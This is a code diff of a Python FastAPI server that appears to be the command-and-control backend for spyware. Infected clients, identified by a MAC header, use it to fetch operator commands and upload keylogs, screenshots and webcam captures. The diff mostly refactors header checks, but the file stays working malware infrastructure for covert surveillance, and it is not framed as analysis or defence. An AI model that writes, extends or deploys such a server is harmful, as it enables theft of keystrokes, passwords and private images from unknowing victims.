@@ -8,6 +8,7 @@ from security import verify_credentials
 from db_utils import DBHandler
 from handle_clients import handle_command_request, handle_first_command, upload_file
 from consts import DBIdentifiers, HTTPHeaders
+from http import HTTPStatus
 
 app = FastAPI()
 db_handler = DBHandler()
@@ -27,7 +28,8 @@ async def add_commands_html(credentials: HTTPBasicCredentials
 
 
 @app.get('/view_clients.html')
-async def root(credentials: HTTPBasicCredentials = Depends(verify_credentials)) -> HTMLResponse:
+async def view_clients(credentials: HTTPBasicCredentials
+                       = Depends(verify_credentials)) -> HTMLResponse:
     with open('source_files/view_clients.html', 'r') as file:
         return HTMLResponse(file.read())
 
@@ -53,37 +55,29 @@ async def add_commands(credentials: HTTPBasicCredentials = Depends(verify_creden
 
 @app.get('/first_command')
 async def first_command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
-    try:
-        request.headers[HTTPHeaders.MAC]
-    except KeyError:
-        return HTTPException(status_code=404)
+    if HTTPHeaders.MAC not in request.headers:
+        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
     return handle_first_command(request)
 
 
 @app.get('/command')
 async def command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
-    try:
-        request.headers[HTTPHeaders.MAC]
-    except KeyError:
-        return HTTPException(status_code=404)
+    if HTTPHeaders.MAC not in request.headers:
+        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
     return handle_command_request(request)
 
 
 @app.post('/keylog_data')
 async def keylog(request: Request) -> Union[None, HTTPException]:
-    try:
-        request.headers[HTTPHeaders.MAC]
-    except KeyError:
-        return HTTPException(status_code=404)
+    if HTTPHeaders.MAC not in request.headers:
+        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
     await upload_file(request, 'log', DBIdentifiers.KEYLOG, 'txt', True)
 
 
 @app.post('/screenshot')
 async def screenshot(request: Request) -> Union[None, HTTPException]:
-    try:
-        request.headers[HTTPHeaders.MAC]
-    except KeyError:
-        return HTTPException(status_code=404)
+    if HTTPHeaders.MAC not in request.headers:
+        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
     # retrieve image file type
     file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
     await upload_file(request, 'screenshot', DBIdentifiers.SCREENSHOT, file_type)
@@ -91,10 +85,8 @@ async def screenshot(request: Request) -> Union[None, HTTPException]:
 
 @app.post('/webcam_capture')
 async def webcam_capture(request: Request) -> Union[None, HTTPException]:
-    try:
-        request.headers[HTTPHeaders.MAC]
-    except KeyError:
-        return HTTPException(status_code=404)
+    if HTTPHeaders.MAC not in request.headers:
+        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
     # retrieve image file type
     file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
     await upload_file(request, 'webcam', DBIdentifiers.WEBCAM, file_type)
